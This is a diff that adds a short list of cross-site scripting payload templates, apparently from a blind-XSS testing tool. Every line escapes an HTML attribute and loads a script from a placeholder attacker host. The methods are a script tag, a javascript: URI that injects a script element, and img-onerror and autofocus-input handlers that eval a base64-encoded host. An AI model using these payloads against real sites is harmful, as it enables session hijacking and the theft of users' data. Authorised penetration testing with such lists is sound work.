@@ -1,0 +1,4 @@
+"><script src={host}></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'{{host}}\';document.body.appendChild(a)')
+"><img src=x id={b64_host}&#61; onerror=eval(atob(this.id))>
+"><input onfocus=eval(atob(this.id)) id={b64_host}&#61; autofocus>
